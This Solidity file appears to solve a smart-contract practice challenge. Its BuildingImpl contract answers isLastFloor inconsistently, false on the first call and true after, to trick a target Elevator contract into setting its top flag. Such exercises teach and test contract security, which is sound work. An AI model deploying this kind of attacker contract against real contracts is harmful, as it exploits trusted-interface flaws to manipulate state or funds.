pragma solidity ^0.4.18;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public;
}

contract BuildingImpl {
    uint public counter = 0;
    
    function isLastFloor(uint _floor) view public returns (bool) {
        if (counter > 0) return true;
        if (_floor == 0) {
            counter++;
            return false;
        }
    }
    
    function callGoTo(address elevatorAddress, uint _floor) public {
        Elevator elevator = Elevator(elevatorAddress);
        elevator.goTo(_floor);
    }
}
